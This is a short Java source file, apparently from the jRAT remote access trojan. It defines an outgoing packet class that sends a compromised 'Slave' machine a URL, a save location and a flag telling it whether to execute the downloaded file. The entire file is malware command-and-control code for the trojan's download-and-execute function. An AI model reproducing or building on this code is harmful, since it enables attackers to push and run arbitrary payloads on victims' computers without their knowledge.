package io.jrat.client.packets.outgoing;

import io.jrat.client.Slave;

import java.io.DataOutputStream;


public class Packet34AdvancedDownload extends AbstractOutgoingPacket {

	private String url;
	private boolean execute;
	private String location;

	public Packet34AdvancedDownload(String url, boolean execute, String location) {
		this.url = url;
		this.execute = execute;
		this.location = location;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(url);
		dos.writeBoolean(execute);
		slave.writeLine(location);
	}

	@Override
	public byte getPacketId() {
		return 34;
	}

}
